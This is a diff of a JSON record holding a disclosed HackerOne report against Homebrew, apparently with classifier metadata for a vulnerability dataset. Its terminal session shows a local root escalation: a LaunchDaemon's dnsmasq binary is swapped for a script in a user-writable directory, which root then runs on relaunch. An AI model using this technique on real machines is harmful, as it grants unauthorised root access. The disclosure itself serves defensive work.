@@ -1,64 +1,64 @@
 {
-    "reported_to": "Homebrew",
-    "reported_by": "keeleysam ",
-    "title": "Homebrew installed LaunchDaemons create simple root esclations",
-    "content": "\nMany programs installed via Homebrew require services to function as expected - most of the time these are LaunchAgents but sometimes they need to run as root via LaunchDaemons to function properly. While Homebrew attempts to secure the executables run by the LaunchDaemons that it installs, any other program running as the user can easily swap out the program for a simple root escalation.\nReproduction steps:\nIn this case, we'll be looking at dnsmasq, but there are many others\nInstall macOS Mojave 10.14.5, create an account and login.\nInstall homebrew with the instructions on brew.sh.\nRun brew install dnsmasq - brew will tell the user to run sudo brew services start dnsmasq\nRun sudo brew services start dnsmasq as prompted.\nCode 511 Bytes\n1samuels-Mac:~ samuel$ sudo brew services start dnsmasq\n2Password:\n3==> Tapping homebrew/services\n4Cloning into '/usr/local/Homebrew/Library/Taps/homebrew/homebrew-services'...\n5remote: Enumerating objects: 17, done.\n6remote: Counting objects: 100% (17/17), done.\n7remote: Compressing objects: 100% (14/14), done.\n8remote: Total 17 (delta 0), reused 12 (delta 0), pack-reused 0\n9Unpacking objects: 100% (17/17), done.\n10Tapped 1 command (50 files, 62.6KB).\n11==> Successfully started `dnsmasq` (label: homebrew.mxcl.dnsmasq)\nWe'll find a new LaunchDaemon has been created:\nCode 653 Bytes\n1samuels-Mac:~ samuel$ cat /Library/LaunchDaemons/homebrew.mxcl.dnsmasq.plist \n2<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n3<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n4<plist version=\"1.0\">\n5  <dict>\n6    <key>Label</key>\n7    <string>homebrew.mxcl.dnsmasq</string>\n8    <key>ProgramArguments</key>\n9    <array>\n10      <string>/usr/local/opt/dnsmasq/sbin/dnsmasq</string>\n11      <string>--keep-in-foreground</string>\n12      <string>-C</string>\n13      <string>/usr/local/etc/dnsmasq.conf</string>\n14    </array>\n15    <key>RunAtLoad</key>\n16    <true/>\n17    <key>KeepAlive</key>\n18    <true/>\n19  </dict>\n20</plist>\nIf we look at the folder /usr/local/opt/dnsmasq/sbin we can see that our user doesn't have write permissions on the /usr/local/opt/dnsmasq/sbin/dnsmasq program which the LaunchDaemon runs.\nCode 359 Bytes\n1samuels-Mac:~ samuel$ ls -lah /usr/local/opt/dnsmasq/sbin\n2total 560\n3drwxr-xr-x   3 samuel  staff    96B Oct 18  2018 .\n4drwxr-xr-x  10 samuel  staff   320B May 20 12:24 ..\n5-r-xr-xr-x   1 samuel  staff   279K Oct 18  2018 dnsmasq\n6samuels-Mac:~ samuel$ echo \"\" >> /usr/local/opt/dnsmasq/sbin/dnsmasq \n7-bash: /usr/local/opt/dnsmasq/sbin/dnsmasq: Permission denied\nHowever, because our user does have write permissions on the /usr/local/opt/dnsmasq/sbin directory, an attacker can move /usr/local/opt/dnsmasq/sbin/dnsmasq to the side and replace it with a different executable:\nCode 738 Bytes\n1samuels-Mac:~ samuel$ cat /tmp/evil.sh \n2#!/bin/sh\n3\n4touch /Library/evil\n5\n6exit 0\n7\n8samuels-Mac:~ samuel$ ls -lah /tmp/evil.sh \n9-rwxr-xr-x  1 samuel  wheel    40B May 20 12:30 /tmp/evil.sh\n10samuels-Mac:~ samuel$ mv /usr/local/opt/dnsmasq/sbin/dnsmasq /usr/local/opt/dnsmasq/sbin/dnsmasq.bak\n11samuels-Mac:~ samuel$ mv /tmp/evil.sh /usr/local/opt/dnsmasq/sbin/dnsmasq\n12samuels-Mac:~ samuel$ ls -lah /usr/local/opt/dnsmasq/sbin/\n13total 568\n14drwxr-xr-x   4 samuel  staff   128B May 20 12:31 .\n15drwxr-xr-x  10 samuel  staff   320B May 20 12:24 ..\n16-rwxr-xr-x   1 samuel  wheel    40B May 20 12:30 dnsmasq\n17-r-xr-xr-x   1 samuel  staff   279K Oct 18  2018 dnsmasq.bak\n18samuels-Mac:~ samuel$ ls -lah /Library/evil\n19ls: /Library/evil: No such file or directory\nOnce the service relaunches for any reason (reboot of the Mac is most likely), root will execute the malicious executable.\nCode 104 Bytes\n1samuels-Mac:~ samuel$ ls -lah /Library/evil \n2-rw-r--r--  1 root  wheel     0B May 20 12:34 /Library/evil\nImpact\nAny homebrew formula which prompts users to run sudo brew services start opens up this vulnerability.\nOnce this is opened up, any attacker who can run code as the user can easily escalate to root.\n\n",
-    "severity": [
-        7.0,
-        8.9
+  "reported_to": "Homebrew",
+  "reported_by": "keeleysam ",
+  "title": "Homebrew installed LaunchDaemons create simple root esclations",
+  "content": "\nMany programs installed via Homebrew require services to function as expected - most of the time these are LaunchAgents but sometimes they need to run as root via LaunchDaemons to function properly. While Homebrew attempts to secure the executables run by the LaunchDaemons that it installs, any other program running as the user can easily swap out the program for a simple root escalation.\nReproduction steps:\nIn this case, we'll be looking at dnsmasq, but there are many others\nInstall macOS Mojave 10.14.5, create an account and login.\nInstall homebrew with the instructions on brew.sh.\nRun brew install dnsmasq - brew will tell the user to run sudo brew services start dnsmasq\nRun sudo brew services start dnsmasq as prompted.\nCode 511 Bytes\n1samuels-Mac:~ samuel$ sudo brew services start dnsmasq\n2Password:\n3==> Tapping homebrew/services\n4Cloning into '/usr/local/Homebrew/Library/Taps/homebrew/homebrew-services'...\n5remote: Enumerating objects: 17, done.\n6remote: Counting objects: 100% (17/17), done.\n7remote: Compressing objects: 100% (14/14), done.\n8remote: Total 17 (delta 0), reused 12 (delta 0), pack-reused 0\n9Unpacking objects: 100% (17/17), done.\n10Tapped 1 command (50 files, 62.6KB).\n11==> Successfully started `dnsmasq` (label: homebrew.mxcl.dnsmasq)\nWe'll find a new LaunchDaemon has been created:\nCode 653 Bytes\n1samuels-Mac:~ samuel$ cat /Library/LaunchDaemons/homebrew.mxcl.dnsmasq.plist \n2<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n3<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n4<plist version=\"1.0\">\n5  <dict>\n6    <key>Label</key>\n7    <string>homebrew.mxcl.dnsmasq</string>\n8    <key>ProgramArguments</key>\n9    <array>\n10      <string>/usr/local/opt/dnsmasq/sbin/dnsmasq</string>\n11      <string>--keep-in-foreground</string>\n12      <string>-C</string>\n13      <string>/usr/local/etc/dnsmasq.conf</string>\n14    </array>\n15    <key>RunAtLoad</key>\n16    <true/>\n17    <key>KeepAlive</key>\n18    <true/>\n19  </dict>\n20</plist>\nIf we look at the folder /usr/local/opt/dnsmasq/sbin we can see that our user doesn't have write permissions on the /usr/local/opt/dnsmasq/sbin/dnsmasq program which the LaunchDaemon runs.\nCode 359 Bytes\n1samuels-Mac:~ samuel$ ls -lah /usr/local/opt/dnsmasq/sbin\n2total 560\n3drwxr-xr-x   3 samuel  staff    96B Oct 18  2018 .\n4drwxr-xr-x  10 samuel  staff   320B May 20 12:24 ..\n5-r-xr-xr-x   1 samuel  staff   279K Oct 18  2018 dnsmasq\n6samuels-Mac:~ samuel$ echo \"\" >> /usr/local/opt/dnsmasq/sbin/dnsmasq \n7-bash: /usr/local/opt/dnsmasq/sbin/dnsmasq: Permission denied\nHowever, because our user does have write permissions on the /usr/local/opt/dnsmasq/sbin directory, an attacker can move /usr/local/opt/dnsmasq/sbin/dnsmasq to the side and replace it with a different executable:\nCode 738 Bytes\n1samuels-Mac:~ samuel$ cat /tmp/evil.sh \n2#!/bin/sh\n3\n4touch /Library/evil\n5\n6exit 0\n7\n8samuels-Mac:~ samuel$ ls -lah /tmp/evil.sh \n9-rwxr-xr-x  1 samuel  wheel    40B May 20 12:30 /tmp/evil.sh\n10samuels-Mac:~ samuel$ mv /usr/local/opt/dnsmasq/sbin/dnsmasq /usr/local/opt/dnsmasq/sbin/dnsmasq.bak\n11samuels-Mac:~ samuel$ mv /tmp/evil.sh /usr/local/opt/dnsmasq/sbin/dnsmasq\n12samuels-Mac:~ samuel$ ls -lah /usr/local/opt/dnsmasq/sbin/\n13total 568\n14drwxr-xr-x   4 samuel  staff   128B May 20 12:31 .\n15drwxr-xr-x  10 samuel  staff   320B May 20 12:24 ..\n16-rwxr-xr-x   1 samuel  wheel    40B May 20 12:30 dnsmasq\n17-r-xr-xr-x   1 samuel  staff   279K Oct 18  2018 dnsmasq.bak\n18samuels-Mac:~ samuel$ ls -lah /Library/evil\n19ls: /Library/evil: No such file or directory\nOnce the service relaunches for any reason (reboot of the Mac is most likely), root will execute the malicious executable.\nCode 104 Bytes\n1samuels-Mac:~ samuel$ ls -lah /Library/evil \n2-rw-r--r--  1 root  wheel     0B May 20 12:34 /Library/evil\nImpact\nAny homebrew formula which prompts users to run sudo brew services start opens up this vulnerability.\nOnce this is opened up, any attacker who can run code as the user can easily escalate to root.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Privilege Escalation"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1558730160,
+  "report_url": "https://hackerone.com/reports/586251",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Install macOS Mojave 10.14.5, create an account and login."
     ],
-    "bounty": null,
-    "weaknesses": [
-        "Privilege Escalation"
+    [
+      2,
+      "Install homebrew with the instructions on brew.sh."
     ],
-    "screenshots": {},
-    "disclosed_date": 1558730160,
-    "report_url": "https://hackerone.com/reports/586251",
-    "is_multi_component": true,
-    "complexity": "MEDIUM",
-    "novelty": "MEDIUM",
-    "vuln_category": "CODE",
-    "steps": [
-        [
-            1,
-            "Install macOS Mojave 10.14.5, create an account and login."
-        ],
-        [
-            2,
-            "Install homebrew with the instructions on brew.sh."
-        ],
-        [
-            3,
-            "Run brew install dnsmasq - brew will tell the user to run sudo brew services start dnsmasq"
-        ],
-        [
-            4,
-            "Run sudo brew services start dnsmasq as prompted."
-        ],
-        [
-            5,
-            "Replace the dnsmasq executable with a malicious script."
-        ],
-        [
-            6,
-            "Wait for the service to relaunch (e.g., via reboot) to execute the malicious script as root."
-        ]
+    [
+      3,
+      "Run brew install dnsmasq - brew will tell the user to run sudo brew services start dnsmasq"
     ],
-    "vuln_description": "Homebrew-installed LaunchDaemons can be exploited for root escalation by replacing the executable they run with a malicious script, as the user has write permissions on the directory containing the executable.",
-    "reason": "The vulnerability involves understanding Homebrew's service management and LaunchDaemons, but the steps to exploit it are straightforward once these components are known. The interaction between directory permissions and service execution is not overly complex.",
-    "new_complexity": "MEDIUM",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "idor_detectable": false,
-    "authnz_byppass_detectable": true,
-    "is_simple_payload": true,
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "idor_detectable": false,
-        "authnz_byppass_detectable": false
-    }
+    [
+      4,
+      "Run sudo brew services start dnsmasq as prompted."
+    ],
+    [
+      5,
+      "Replace the dnsmasq executable with a malicious script."
+    ],
+    [
+      6,
+      "Wait for the service to relaunch (e.g., via reboot) to execute the malicious script as root."
+    ]
+  ],
+  "vuln_description": "Homebrew-installed LaunchDaemons can be exploited for root escalation by replacing the executable they run with a malicious script, as the user has write permissions on the directory containing the executable.",
+  "reason": "The vulnerability involves understanding Homebrew's service management and LaunchDaemons, but the steps to exploit it are straightforward once these components are known. The interaction between directory permissions and service execution is not overly complex.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": false,
+  "authnz_byppass_detectable": true,
+  "is_simple_payload": true,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves a local privilege escalation where a user can replace a root-executable file in a directory they have write access to. This is not detectable via the proposed HTTP request/response analysis methodology because it occurs at the filesystem level and does not involve web application authentication or authorization boundaries.",
+    "is_detectable": false
+  }
 }
